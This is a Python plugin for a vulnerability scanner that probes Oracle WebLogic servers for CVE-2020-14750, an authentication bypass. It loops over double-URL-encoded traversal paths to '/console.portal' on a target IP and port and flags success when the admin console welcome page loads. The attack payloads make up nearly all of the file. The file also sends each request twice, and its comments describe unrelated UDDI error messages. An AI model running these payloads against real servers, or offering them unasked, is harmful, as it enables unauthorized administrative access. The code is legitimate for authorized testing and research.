#!/usr/bin/env python3
# _*_ coding:utf-8 _*_
# CVE-2020-14750
# updated 2022/07/17
# by 0xn0ne

from multiprocessing.managers import SyncManager
from typing import Any, Dict, List, Mapping, Tuple, Union
import requests

from utils import http

# 有漏洞的情况
# 端口不存在
# An error has occurred
# weblogic.uddi.client.structures.exception.XML_SoapException: Tried all: '1' addresses, but could not connect over HTTP to server: 'x.x.x.x', port: '80'
# 端口存在
# An error has occurred
# weblogic.uddi.client.structures.exception.XML_SoapException: Received a response from url: http://x.x.x.x:7001 which did not have a valid SOAP content-type: text/html.
from stars import Star, target_type


# @universe.groups()
class CVE_2020_14750(Star):
    info = {
        'NAME': '',
        'CVE': 'CVE-2020-14750',
        'TAG': []
    }
    type = target_type.VULNERABILITY

    def light_up(self, dip, dport, force_ssl=None, *args, **kwargs) -> (bool, dict):
        session = requests.Session()
        paths = [
            '/images/%252E./console.portal',
            '/images/%252e%252e%252fconsole.portal',
            '/css/%252E./console.portal',
            '/css/%252e%252e%252fconsole.portal',
            '/console/images/%252E./console.portal',
            '/console/images/%252e%252e%252fconsole.portal',
            '/console/css/%252E./console.portal',
            '/console/css/%252e%252e%252fconsole.portal', ]
        for path in paths:
            r, data = http(
                'http://{}:{}{}'.format(dip, dport, path), ssl=force_ssl, session=session, timeout=5)
            r, data = http(
                'http://{}:{}{}'.format(dip, dport, path), ssl=force_ssl, session=session, timeout=5)
            if r and 'id="welcome"' in r.text:
                return True, {'url': r.url}
        return False, {}


def run(queue: SyncManager.Queue, data: Dict):
    obj = CVE_2020_14750()
    result = {
        'IP': data['IP'],
        'PORT': data['PORT'],
        'NAME': obj.info['CVE'] if obj.info['CVE'] else obj.info['NAME'],
        'MSG': '',
        'STATE': False
    }
    result['STATE'], result['MSG'] = obj.light_and_msg(
        data['IP'], data['PORT'], data['IS_SSL'])

    queue.put(result)
